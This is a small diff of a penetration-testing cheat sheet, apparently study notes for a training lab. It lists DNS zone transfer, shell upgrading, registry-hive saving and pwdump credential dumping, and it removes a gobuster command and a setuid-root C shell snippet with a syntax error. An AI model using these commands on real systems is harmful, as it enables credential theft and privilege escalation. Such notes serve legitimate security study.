@@ -1,7 +1,5 @@
 Zone-Transfer- host -l megacorpone.com ns2.megacorpone.com - sometimes dumps the list of hosts and IPs
 
-gobuster -u 10.11.1. -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
-
 Better Shell python -c 'import pty; pty.spawn("/bin/bash")' 
 
 Priv_Esc - linux privchecker.py GOOGLE
@@ -33,9 +31,4 @@ C:\> reg.exe save hklm\system c:\windows\temp\system.save
 
 pwdump system.save sam.save
 
-C code to spawn shell 
 
-int main(void) {
-setgid(0); setuid(0);
-execl("/bin/sh". "sh". 0);
-}
